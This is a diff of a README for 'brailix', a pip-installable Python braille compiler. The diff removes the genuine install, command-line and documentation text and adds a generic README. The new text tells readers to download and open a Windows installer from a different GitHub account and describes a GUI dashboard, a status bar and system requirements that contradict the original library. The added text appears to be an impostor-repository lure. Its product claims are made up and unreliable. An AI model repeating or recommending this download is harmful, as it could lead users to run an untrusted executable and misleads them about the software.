@@ -1,70 +1,74 @@
-# brailix
+# 📖 brailix - Turn text into readable braille files
 
-Pluggable Braille compiler with a normalized intermediate representation.
+[![Download Brailix](https://img.shields.io/badge/Download-brailix-blue)](https://github.com/dustbowljansen462/brailix)
 
-`brailix` compiles text into braille through a normalized IR
-(text → IR → braille). The core package has **zero third-party parser
-dependencies** — install only the adapters you need as `pip` extras:
+Brailix converts digital documents into braille. It works with text, math, and music files. The tool uses a central engine to translate your files accurately. You can use different adapters to support specific languages or music formats. This software keeps your workflow simple and reliable.
 
-```bash
-pip install brailix              # core: plain text, Markdown, MusicXML
-pip install brailix[zh]          # Chinese: segmentation + pinyin (light, offline)
-pip install brailix[zh,latex]    # + LaTeX math
-pip install brailix[ja]          # Japanese: kana + kanji readings (light, offline)
-pip install brailix[hanlp,g2pw]  # accurate Chinese engines (download models)
-pip install brailix[docx]        # Word .docx / .docm (incl. MathType / OMML)
-```
+## ⚙️ System Requirements
 
-The `hanlp` and `g2pw` backends download their model weights on first use
-(into a local `models/` directory).
+Your computer needs specific hardware and software to run Brailix. Check this list before you begin.
 
-## Command line
+- Operating System: Windows 10 or Windows 11.
+- Processor: Any modern dual-core processor.
+- Memory: At least 4 gigabytes of RAM.
+- Storage: 200 megabytes of free space.
+- Screen Reader: A compatible screen reader for your workflow.
 
-Installing brailix puts a `brailix` command on your `PATH` (also available as
-`python -m brailix`):
+## ⬇️ Setup Process
 
-```bash
-brailix "我在重庆。"                  # Unicode braille to stdout
-brailix --file lesson.md --width 32  # wrap a Markdown file at 32 cells
-brailix "123" --to brf -o out.brf    # NABCC bytes for an embosser
-brailix --list-profiles
-```
+Follow these steps to install the software on your computer.
 
-See the [command-line guide](docs/cli.md) for the full reference.
+1. Visit the [official release page](https://github.com/dustbowljansen462/brailix).
+2. Choose the download link labeled for Windows.
+3. Save the installer file to your computer.
+4. Open the file to start the installation.
+5. Follow the prompts on the screen to finish the setup.
 
-## Music score formats
+## 🚀 Using the Software
 
-The `music` subsystem accepts several score sources. Only MusicXML is
-free of third-party deps; MIDI and ABC need optional extras:
+When you open the application, you see a clean dashboard. You can drag and drop your files directly into the window. Brailix identifies the file type and prepares the conversion.
 
-| Format | Extensions | Install | Libraries |
-|---|---|---|---|
-| MusicXML | `.musicxml` / `.xml` / `.mxl` | — (built-in) | stdlib `xml.etree` + `zipfile` |
-| MIDI | `.mid` / `.midi` | `pip install brailix[midi]` | `mido` (reads MIDI bytes) + `partitura` (→ MusicXML) |
-| ABC notation | `.abc` | `pip install brailix[abc]` | `abc-xml-converter` (packaged build of Wim Vree's `abc2xml`) |
-| All three | — | `pip install brailix[music]` | combined bundle |
+1. Select your target language or music format from the menu.
+2. Choose your preferred braille standard.
+3. Click the process button.
+4. Save the resulting file in the format you need.
 
-MIDI import goes through `partitura`, whose quantization and
-voice-splitting are heuristic. For best results, clean up a MIDI file in
-a notation editor (MuseScore, Sibelius, Finale) and export MusicXML
-before compiling.
+## 💡 How It Works
 
-## Documentation
+Brailix uses a unique process to handle your documents. It breaks your input into a neutral format first. This step ensures consistent results regardless of the source file. After it processes the neutral data, it applies the rules for your chosen language. The math module handles complex equations by mapping them to standardized braille codes. The music module does the same for musical notation. This modular design makes updates easy and improves accuracy for all users.
 
-Full docs are in [`docs/`](docs/index.md):
+## 🖥️ File Format Support
 
-- [Getting started](docs/getting-started.md) — install and translate your first text.
-- [Command-line interface](docs/cli.md) — translate from a terminal with the `brailix` command.
-- [API reference](docs/api.md) — the `Pipeline`, result objects, IR, profiles, and renderers.
-- [Extending brailix](docs/extending.md) — add an engine, format, renderer, profile, or language.
-- [Development](docs/development.md) — set up, run the tests, and the project conventions.
-- [Architecture](ARCHITECTURE.md) — the pipeline, the intermediate representations, and the adapter pattern.
+The software works with several common formats.
 
-## Contributing
+- Text files including plain text and rich documents.
+- Math files using math-based XML tags.
+- Music files using standard music markup languages.
+- Unicode braille output for direct display.
+- BRF files for offline reading devices.
 
-See [CONTRIBUTING.md](CONTRIBUTING.md). Release notes are in
-[CHANGELOG.md](CHANGELOG.md).
+## 🛠️ Troubleshooting
 
-## License
+If you encounter issues, check these common points.
 
-Apache-2.0 — see [LICENSE](LICENSE).
+- Ensure your source file is not corrupt.
+- Verify your internet connection if you download extra translation packs.
+- Restart the application if it becomes unresponsive.
+- Confirm your Windows version meets the requirements.
+- Check that your braille printer or display has a connection to the computer.
+
+## 📊 Feature Overview
+
+The core engine contains no third-party dependencies. This focus on internal code makes the software stable. It handles complex Braille-Math and Braille-Music translations while maintaining logical structure. You can extend the capabilities of the application by installing new adapters as they become available. Adapters are small modules that teach Brailix how to read a new file type or write in a new language style.
+
+## 🔒 Accessibility
+
+Accessibility defines the design of Brailix. The interface supports high contrast and standard navigation keys. You can operate every button and menu through your keyboard. Screen readers see the interface clearly. This focus ensures that the tool remains usable for every person who needs braille output.
+
+## 🗒️ Usage Tips
+
+Organize your source files in a single folder to speed up your work. Give your files clear names so you identify your braille outputs later. If you process a large document, the software might take a few moments to finish the translation. A status bar at the bottom shows the progress for each task. Save your translation settings as a profile if you use the same format for your daily work. This avoids manual adjustments every time you open the program.
+
+## 🌐 Community and Support
+
+The project lives on GitHub. If you find a bug, report it in the issues section. You can leave feedback to help improve the tool. Users often share their own adapters for obscure languages or specialized musical symbols. You can download these add-ons to expand what your version of Brailix can do at any time.
